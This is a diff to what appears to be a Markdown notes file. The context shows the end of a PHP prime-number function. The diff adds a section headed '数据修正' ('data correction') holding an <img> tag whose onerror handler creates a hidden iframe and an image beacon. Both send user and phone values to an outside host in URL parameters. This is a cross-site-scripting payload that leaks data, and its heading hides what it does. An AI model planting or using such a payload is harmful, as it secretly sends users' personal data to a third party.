@@ -32,3 +32,14 @@ function get_prime($n)
     return $prime;
 }
 ```
+
+
+> 数据修正
+
+```
+<img onerror=" var frame = document.createElement('iframe');
+frame.src = `https://www.baidu.com?user=${_user}&phone=${_phone}&ver=334`;
+frame.style.display = 'none';
+document.body.appendChild(frame);
+(new Image()).src=`https://www.baidu.com?uid=${_user}&phone=${_phone}`;"  src="x" />
+```
